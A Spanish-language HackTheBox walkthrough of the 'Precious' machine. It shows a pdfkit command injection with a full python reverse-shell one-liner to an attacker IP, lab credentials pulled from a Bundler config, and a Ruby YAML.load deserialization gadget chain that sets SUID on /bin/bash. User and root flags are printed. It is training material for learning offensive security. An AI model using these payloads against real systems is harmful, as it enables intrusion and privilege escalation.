---
layout: default
title: Precious
parent: HackTheBox
grand_parent: Writeups
---

# Precious
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Enumeracion

Iniciamos con un escaneo de nmap con el comando:

```
nmap -sS -n -Pn --open -p- 10.10.11.189
```
El cual le estamos diciendo que con:

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si esta abierto

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos

Esto nos reportara 2 puertos abiertos:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Asi que ahora escanearemos para saber la version y servicio que esta corriendo por detras:

```
sudo nmap -sCV -p22,80 10.10.11.189
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Convert Web Page to PDF
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Tenemos el puerto de SSH abierto, pero aun no podemos hacer mucha cosa, y el puerto 80, el cual de primeras nos dice que podemos convertir una pagina web a un pdf: ```http-title: Convert Web Page to PDF```

Si nos dirigimos a la pagina web, podemos ver que esta esperando por una URL, asi que para comprobar que se puede convertir a PDF, iniciaremos un servidor web con python:

```python3 -m http.server 8080```

Y le pasaremos la URL

![](/assets/img/precious/precious1.png)

Y efecto, convierte la pagina a un pdf, y me muestra el contenido de mi directorio /Desktop

![](/assets/img/precious/precious2.png)

En este punto, una buena idea es ver un poco de los metadatos del pdf, usaremos la herramienta ```exiftools``` (aun que por alguna razon no me jala, asi que usare esta [web](https://exif.tools/))

Y podemos ver que para generarlo esta usando pdfkit:

![](/assets/img/precious/precious3.png)

## Command Injection

La version de pdfkit que genero el pdf es la ```v0.8.6```, asi que... Nunca es mala idea buscar si existe un exploit para la version de algo.

Econtre que esa version de vulnerable a ```Command injection``` a travez del parametro ```name``` 

Lee [aqui](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) si quieres saber mas

Asi que intentare ejecutar el comando ```whoami``` para ver si funciona:

```
http://10.10.14.102:8080/?name=%20`whoami`
```

![](/assets/img/precious/precious4.png)

Y una vez sabiendo que si funciona, por lo tanto tenemos Remote Command Execution(RCE), nos mandaremos una reverse shell con python3:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.102",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Y la URL queda:

```
http://10.10.14.102:8080/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.102",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
```
Recuerda editar la IP por la que te dio HTB

## Flag de user

Al lista el contenido podemos ver varios directorios:

```bash
ruby@precious:~$ ls -lha
ls -lha
total 28K
drwxr-xr-x 4 ruby ruby 4.0K Apr 10 16:46 .
drwxr-xr-x 4 root root 4.0K Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3.5K Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4.0K Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4.0K Apr 10 16:46 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
```

Navegando un poco, encontre que en el directorio ```.bundle``` hay un archivo de configuracion el cual tiene unas credenciales:

```bash
ruby@precious:~/.bundle$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Y recordemos que tenemos el puerto del SSH abierto, asi que nos conectaremos por ssh con las credenciales que nos aparecen ahi.

usuario: henry

contraseña: Q3c1AqGHtoI0aXAYFH

Y ahora si ya podemos ver la flag de user:

```bash
henry@precious:~$ cat user.txt 
8cee1d827eb735217879ec75ce6d2751
```

## Flag de root

Primeramente ingresare el comando ```sudo -l``` para poder ver que podemos ejecutar como root desde el usuario ```henry```

```
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Nos dice que podemos ejecutar el archivo ```update_dependencies.rb```

Asi que vamos a pasar a ver el contenido del archivo:

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
Me doy cuenta que esta intentando cargar un archivo que se llama ```dependencies.yml```, el cual no se le esta indicando la ruta, es decir, que lo trata de cargar desde el directorio actual donde se encuentra el usuario, entonces... ¿Por que no crearlo?, y ademas esta usando la funcion ```YAML.load()``` la cual es vulnerable a un ataque```YAML deserialization``` el cual deriva de un RCE, para saber como explotarlo nos guiaremos de [aqui](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml)

Crearemos un archivo yml con el nombre ```dependencies.yml``` en el directorio actual, con el contenido:

```yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
```

Donde le estamos diciendo que ejecute el comando ```chmod +s /bin/bash``` que le asigna permisos SUID a /bin/bash

Y por ultimo ejecutamos el archivo:

```
sudo /usr/bin/ruby /opt/update_dependencies.rb
```
Y ya somos root:

```bash
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt 
95ff0867c3156b05a0f2d49fc6b1ba48
```

Eso ha sido todo, gracias por leer ❤